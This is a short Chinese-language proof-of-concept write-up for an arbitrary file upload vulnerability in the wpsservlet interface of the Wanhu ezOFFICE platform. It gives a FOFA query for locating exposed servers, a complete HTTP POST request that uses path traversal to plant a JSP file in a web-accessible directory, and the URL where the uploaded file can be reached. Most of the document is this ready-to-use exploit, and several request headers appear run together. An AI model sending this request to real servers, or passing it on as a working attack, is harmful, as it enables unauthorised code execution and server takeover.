## 万户ezoffice wpsservlet任意文件上传漏洞
万户ezOFFICE协同管理平台是一个综合信息基础应用平台分为企业版和政务版。解决方案由五大应用、两个支撑平台组成，分别为知识管理、工作流程、沟通交流、辅助办公、集成解决方案及应用支撑平台、基础支撑平台。万户ezOFFICE协同管理平台wpsservlet接口存在任意文件上传。攻击者可上传恶意脚本文件获取服务器权限。


## fofa
```
app="万户网络-ezOFFICE"
```

## poc
```
POST /defaultroot/wpsservlet?option=saveNewFile&newdocId=apoxkq&dir=../platform/portal/layout/&fileType=.jsp HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Content-Length: 173Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Connection: close
Content-Type: multipart/form-data; boundary=ufuadpxathqvxfqnuyuqaozvseiueerpDNT: 1
Upgrade-Insecure-Requests: 1

--ufuadpxathqvxfqnuyuqaozvseiueerp
Content-Disposition: form-data; name="NewFile"; filename="apoxkq.jsp"

<% out.print("sasdfghjkj");%>
--ufuadpxathqvxfqnuyuqaozvseiueerp--
```
文件回显路径为/defaultroot/platform/portal/layout/apoxkq.jsp

